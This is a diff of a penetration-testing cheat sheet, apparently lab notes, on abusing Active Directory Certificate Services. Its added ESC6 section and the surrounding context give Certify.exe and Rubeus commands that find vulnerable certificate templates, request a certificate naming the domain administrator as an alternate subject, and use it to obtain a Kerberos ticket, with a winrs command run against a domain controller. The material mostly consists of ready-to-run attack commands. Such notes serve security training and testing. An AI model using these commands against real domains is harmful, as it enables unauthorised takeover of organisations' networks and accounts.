@@ -286,6 +286,7 @@ C:> Certify.exe find /vulnerable
 ```powershell
 # Generating a certificate for any user, it's possible to request TGT on behalf
 #  of the user the cert been generated
+
 # List templates with msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
 C:> Certify.exe find /enrolleeSuppliesSubject
 
@@ -310,7 +311,6 @@ C:> winrs -r:dcorp-dc whoami
 ```powershell
 # Some Templates have policies to allow other Templates to generate certificates
 #  By this technique can generate a cert for a user using a certificate
-
 
 # Enumerate vulnerable templates 
 C:> Certify.exe find /vulnerable
@@ -339,4 +339,18 @@ c:> Rubeus.exe asktgt /user:administrator /certificate:<OOUT_fILE_PREVIOUS_STEP>
 ```
 
 #### ESC6
+```powershell
+# Check if the CA has EDITF_ATTRIBUTESUBJECTALTNAME2. This means that we can request a certificate for ANY user 
+#   from a template that allow enrollment for normal/low-privileged users.
+C:> Certify.exe cas
+#  Find this ->> [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
 
+# Find template where we have rights for enrollment
+C:> Certify.exe find
+#  Find this ->> Enrollment Rights : dcorp\RDPUsers S-1-5-21-1874506631-3219952063-538504511-1116
+
+# Request certificate for alternate DA
+C:> Certify.exe request /ca:<CA_name> /template:"CA-Integration" /altname:administrator
+
+# Convert to PFX and request a TGT as before techniques
+```
